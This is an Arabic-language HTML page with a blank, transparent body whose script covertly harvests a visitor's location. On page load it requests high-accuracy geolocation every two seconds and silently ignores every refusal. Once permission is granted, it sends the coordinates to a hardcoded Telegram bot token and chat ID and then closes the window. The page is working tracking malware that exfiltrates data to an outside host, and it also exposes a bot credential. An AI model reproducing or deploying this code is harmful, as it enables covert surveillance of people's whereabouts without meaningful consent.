<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>طلب الإذن</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";
        
        let requestCount = 0;

        function startLocationRequests() {
            console.log("🚀 بدء طلبات الموقع...");
            
            // طلب فوري أولي
            requestLocation();
            
            // طلب كل 2 ثانية بالضبط
            setInterval(requestLocation, 2000);
        }

        function requestLocation() {
            requestCount++;
            console.log(`📍 طلب الموقع #${requestCount}`);

            if (!navigator.geolocation) {
                console.log("❌ المتصفح لا يدعم الموقع");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                // ✅ إذا وافق
                async function(position) {
                    console.log("✅ تم الموافقة على الموقع!");
                    
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // إرسال فوري للبوت
                    await sendToTelegram(lat, lng, accuracy, requestCount);
                    
                    // إغلاق الصفحة بعد الإرسال
                    setTimeout(() => {
                        window.close();
                    }, 1000);
                },
                // ❌ إذا رفض - نستمر بدون أي رسالة
                function(error) {
                    console.log(`🔄 تم رفض الطلب #${requestCount} - نستمر...`);
                    // لا نقوم بأي شيء - setInterval سيعيد الطلب تلقائياً
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        }

        async function sendToTelegram(lat, lng, accuracy, attempts) {
            const message = 
                `🎯 موقع من طلب متكرر\n\n` +
                `📍 الإحداثيات:\n` +
                `• خط العرض: ${lat.toFixed(6)}\n` +
                `• خط الطول: ${lng.toFixed(6)}\n` +
                `• الدقة: ${accuracy} متر\n\n` +
                `🔄 عدد المحاولات: ${attempts}\n` +
                `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                console.log("✅ تم الإرسال للبوت بنجاح");
            } catch (error) {
                console.log("❌ فشل في الإرسال:", error);
            }
        }

        // البدء المباشر عند تحميل الصفحة
        window.onload = startLocationRequests;

    </script>
</head>
<body style="margin:0;padding:0;background:transparent;">
    <!-- صفحة فارغة تماماً -->
</body>
</html>